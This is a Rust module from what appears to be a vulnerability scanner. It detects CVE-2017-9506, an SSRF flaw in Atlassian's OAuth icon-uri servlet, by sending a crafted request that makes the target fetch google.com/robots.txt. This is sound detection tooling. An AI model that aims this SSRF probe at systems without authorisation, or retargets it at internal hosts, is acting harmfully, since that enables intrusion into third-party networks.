use crate::{
    scanner::{
        module,
        findings,
        ReportV1,
        Target,
        ModuleName,
    },
    error::PhaserError,
};

pub struct Cve2017_9506{}

impl module::BaseModule for Cve2017_9506 {
    fn name(&self) -> ModuleName {
        return ModuleName::HttpAtlassianCve20179506;
    }

    fn description(&self) -> String {
        return "Check for CVE-2017-9506 (SSRF)".to_string();
    }

    fn author(&self) -> String {
        return "Sylvain Kerkour <sylvain@kerkour.fr>".to_string();
    }

    fn version(&self) -> String {
        return "0.1.0".to_string();
    }
}

// TODO: error handling not found
impl module::PortModule for Cve2017_9506 {
    fn run(&self, _: &ReportV1, target: &Target, port: &findings::Port) -> Result<findings::ModuleResult, PhaserError> {
        let protocol = if port.http {
            "http"
        } else if port.https {
            "https"
        } else {
            ""
        };

        if protocol.is_empty() {
            return Ok(findings::ModuleResult::None);
        }

        let url = format!("{}://{}:{}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com/robots.txt", &protocol, &target.host, &port.id);
        let body = reqwest::get(&url)?
            .text()?;

        if body.contains("user-agent: *") && body.contains("disallow") {
            return Ok(findings::ModuleResult::Url(findings::Url{
                url,
            }));
        }

        return Ok(findings::ModuleResult::None);
    }
}


#[cfg(test)]
mod tests {
    use crate::scanner::module::BaseModule;

    #[test]
    fn module_name() {
        let module = super::Cve2017_9506{};
        assert_eq!("http/atlassian/cve-2017-9506", module.name().to_string());
    }
}
